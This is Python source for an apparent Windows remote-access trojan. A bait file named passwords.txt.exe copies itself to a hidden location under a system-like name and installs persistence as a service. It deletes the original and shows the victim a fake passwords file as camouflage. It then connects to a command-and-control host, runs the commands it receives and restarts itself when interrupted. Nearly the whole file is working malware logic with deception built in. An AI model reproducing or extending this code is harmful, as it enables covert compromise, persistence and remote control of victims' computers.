#!/usr/bin/env python3
"""
TCP Command Receiver
Connects to a TCP sender and executes received commands.
"""

import os
import platform
import shutil
import socket
import subprocess
import sys
import time

# Import from utils modules
from utils.config import DEFAULT_PORT, RETRY_DELAY, FAKE_PASSWORDS, PAYLOAD_NAME
from utils.common import (
    log,
    dev_pause,
    get_payload_path,
    is_bait_file,
    is_payload,
    parse_cli_arguments,
    copy_dev_mode_marker,
    cleanup_payload_files,
    get_c2_host,
)
from utils.install import check_and_install_service
from utils.modes import ModeManager
from utils.router import CommandRouter
from utils.protocol import receive_text


# ============================================================================
# DEPLOYMENT FUNCTIONS (Stage 1 & 2)
# ============================================================================


def check_buddy_system():
    """
    Safety check: If buddy file exists, show fake error and exit.
    This prevents deployment on the honeypot VM.
    Returns True if buddy detected (safe mode), False otherwise (armed mode).
    """
    import ctypes

    # Determine directory where the executable is running from
    if getattr(sys, "frozen", False):
        application_path = os.path.dirname(sys.executable)
    else:
        application_path = os.path.dirname(os.path.abspath(__file__))

    # Check for buddy file in same directory
    buddy_file_name = "ww2bomberplane.png"
    buddy_file_path = os.path.join(application_path, buddy_file_name)

    if os.path.exists(buddy_file_path):
        # SAFE MODE - Show fake Windows error
        title = "Notepad"
        message = (
            "This file cannot be opened.\n\n"
            "Notepad requires an update to read this document. "
            "Please install the latest Windows 11 updates and restart your computer to get the newest version of Notepad.\n\n"
            "To update: Settings > Windows Update > Check for updates"
        )

        # Display native Windows message box with information icon (0x40)
        ctypes.windll.user32.MessageBoxW(0, message, title, 0x40)
        return True

    return False


def deploy_payload():
    """
    Stage 1: Bait file execution (passwords.txt.exe).
    Copy self to hidden location, spawn payload, and exit.
    """
    try:
        log("\n[Stage 1: Deploying payload...]")

        # Get payload paths (lazy initialization)
        payload_dir, payload_path = get_payload_path()

        # Create payload directory if it doesn't exist
        os.makedirs(payload_dir, exist_ok=True)
        log(f"Payload directory: {payload_dir}")

        # Copy self to payload location
        shutil.copy2(sys.executable, payload_path)
        log(f"Copied to: {payload_path}")

        # Copy .dev_mode marker if running in dev mode
        source_dir = os.path.dirname(sys.executable)
        copy_dev_mode_marker(source_dir, payload_dir)

        # Launch the payload with --delete-file argument
        original_path = sys.executable
        log(f"Launching payload with --delete-file {original_path}")
        subprocess.Popen(
            [payload_path, "--delete-file", original_path],
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
        )

        log("[Stage 1: Complete - Exiting bait file]")
        sys.exit(0)  # Success - no pause needed

    except Exception as e:
        log(f"[Stage 1: Failed - {e}]")
        dev_pause()
        sys.exit(1)  # Failure - exit with error code


def setup_camouflage(original_file: str = None):
    """
    Stage 2 (First-time setup): Replace original bait file with fake passwords.txt
    and open it in notepad for the victim.

    Raises exception if critical operations fail (creating fake file).
    """
    if not original_file or not os.path.exists(original_file):
        return

    log(f"\n[Stage 2: Setting up camouflage...]")

    # Get the directory of the original file (use absolute path)
    original_file = os.path.abspath(original_file)
    original_dir = os.path.dirname(original_file)
    fake_file_path = os.path.join(original_dir, "passwords.txt.txt")

    # Delete the original .exe (not critical - might be locked)
    try:
        os.remove(original_file)
        log(f"Deleted original: {original_file}")
    except Exception as e:
        log(f"Warning: Could not delete original: {e}")
        log("Continuing anyway (file may be locked)")

    # Create fake passwords.txt - CRITICAL, will raise on failure
    with open(fake_file_path, "w", encoding="utf-8") as f:
        f.write(FAKE_PASSWORDS)
    log(f"Created fake passwords: {fake_file_path}")

    # Open the fake file in notepad (not critical - victim can open manually)
    try:
        subprocess.Popen(["notepad.exe", fake_file_path])
        log("Opened passwords in notepad")
    except Exception as e:
        log(f"Warning: Could not open notepad: {e}")

    log("[Stage 2: Camouflage complete]")


# ============================================================================
# MAIN RECEIVER LOOP
# ============================================================================


def start_receiver(host: str, port: int = DEFAULT_PORT) -> None:
    """
    Start the TCP command receiver client.

    Args:
        host: The sender's host address
        port: The sender's port number
    """
    attempt = 1

    # Create mode manager and command router
    mode_manager = ModeManager()
    router = CommandRouter(mode_manager)

    try:
        # Main reconnection loop - runs until user interrupts
        while True:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connected = False

            # Try to connect to the sender, with retries
            while not connected:
                try:
                    log(f"Connecting to {host}:{port}... (attempt {attempt})")
                    client_socket.connect((host, port))
                    connected = True
                    log(f"Connected to {host}:{port}")
                    log("Ready to execute commands (Ctrl+C to exit)\n")
                except ConnectionRefusedError:
                    log(f"Connection refused, retrying in {RETRY_DELAY}s...\n")
                    time.sleep(RETRY_DELAY)
                    attempt += 1
                    client_socket.close()
                    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                except socket.gaierror:
                    log(f"Invalid host address: {host}")
                    dev_pause()
                    sys.exit(1)

            # Reset attempt counter after successful connection
            attempt = 1

            # Continuously receive and execute commands
            connection_lost = False
            try:
                while True:
                    try:
                        # Receive command
                        data = client_socket.recv(4096)

                        if not data:
                            # Connection closed by sender
                            log("\nConnection closed")
                            log("Reconnecting...\n")
                            connection_lost = True
                            break

                        # Decode the command
                        command = data.decode("utf-8").strip()

                        # Route command through the command router
                        router.handle_command(command, client_socket)

                    except ConnectionResetError:
                        log("\nConnection reset")
                        log("Reconnecting...\n")
                        connection_lost = True
                        break
                    except Exception as e:
                        log(f"\nError: {e}")
                        log("Reconnecting...\n")
                        connection_lost = True
                        break
            finally:
                client_socket.close()

            # If connection was lost, continue to outer loop to reconnect
            if not connection_lost:
                break

    except KeyboardInterrupt:
        if platform.system() == "Windows":
            log("\n\nReceiver interrupted - restarting...")
            dev_pause()
            sys.exit(1)  # Non-zero exit triggers service restart
        else:
            log("\n\nExiting...")
            sys.exit(0)  # Clean exit on macOS/Linux - no pause needed
    except Exception as e:
        log(f"Error: {e}")
        dev_pause()
        sys.exit(1)


def run_with_auto_restart(host: str, port: int) -> None:
    """
    Wrapper that automatically restarts the receiver if it crashes.
    Used in daemon mode for crash recovery.

    Windows: Only /quit command can permanently stop the receiver.
    macOS/Linux: Ctrl+C exits cleanly (normal behavior).
    """
    system = platform.system()
    restart_count = 0

    while True:
        try:
            if restart_count > 0:
                log(f"\n[ Restarting receiver (attempt #{restart_count}) ]\n")
            start_receiver(host, port)
            # If we get here, it exited cleanly (only from /quit command)
            break

        except KeyboardInterrupt:
            # Platform-specific behavior
            if system == "Windows":
                # Windows: Treat Ctrl+C as a crash - restart the receiver
                restart_count += 1
                log("\n\nReceiver interrupted with Ctrl+C")
                log(f"Auto-restarting in {RETRY_DELAY} seconds...")
                time.sleep(RETRY_DELAY)
            else:
                # macOS/Linux: Allow clean exit
                log("\n\nExiting...")
                break

        except Exception as e:
            restart_count += 1
            log(f"\n\nReceiver crashed: {e}")
            log(f"Auto-restarting in {RETRY_DELAY} seconds...")
            time.sleep(RETRY_DELAY)


# ============================================================================
# ENTRY POINT
# ============================================================================


if __name__ == "__main__":
    # Only run deployment logic on Windows and when frozen/compiled (PyInstaller or Nuitka)
    if platform.system() == "Windows" and (getattr(sys, "frozen", False) or "__compiled__" in globals()):

        # STAGE 1: Bait file execution (passwords.txt.exe)
        if is_bait_file():
            log("\n[ Bait file detected - Deploying payload ]\n")

            # Check if running in dev mode:
            # 1. Running as .py file (not frozen/compiled)
            # 2. .dev_mode marker file exists in executable directory
            is_frozen = getattr(sys, "frozen", False) or "__compiled__" in globals()
            exe_dir = os.path.dirname(sys.executable if is_frozen else os.path.abspath(__file__))
            dev_mode_marker = os.path.join(exe_dir, ".dev_mode")
            is_dev_mode = not is_frozen or os.path.exists(dev_mode_marker)

            # Buddy system safety check (skip in dev mode)
            if not is_dev_mode:
                if check_buddy_system():
                    log("[ Buddy file detected - Safe mode activated ]")
                    sys.exit(0)  # Exit safely without deployment
            else:
                log("[ Dev mode detected - Skipping buddy check ]")

            # Proceed with normal deployment if no buddy detected
            deploy_payload()
            # deploy_payload() calls sys.exit(0) - execution stops here

        # STAGE 2: Payload execution (taskhostw.exe)
        elif is_payload():
            log("\n[ TCP Command Receiver - Payload Mode ]\n")

            # Parse CLI arguments
            delete_file = parse_cli_arguments()

            # Check if persistence is already installed (will raise on failure)
            check_and_install_service()

            # If we just installed (first run), setup camouflage (will raise on failure)
            # Check if task was just created by seeing if delete_file was provided
            if delete_file:
                setup_camouflage(delete_file)

            # Run with auto-restart wrapper for crash recovery
            run_with_auto_restart(get_c2_host(), DEFAULT_PORT)

        else:
            # Unrecognized executable name - fail fast
            log(f"\n[ ERROR: Unrecognized executable name ]\n")
            log(f"Current name: {os.path.basename(sys.executable)}")
            log(f"Expected: 'passwords.txt.exe' or '{PAYLOAD_NAME}'")
            log("Exiting...\n")
            dev_pause()
            sys.exit(1)

    else:
        # Running in development mode (not frozen) or on non-Windows
        log("\n[ TCP Command Receiver - Development Mode ]\n")

        if platform.system() == "Windows":
            check_and_install_service()

        # Run with auto-restart wrapper for crash recovery
        run_with_auto_restart(get_c2_host(), DEFAULT_PORT)
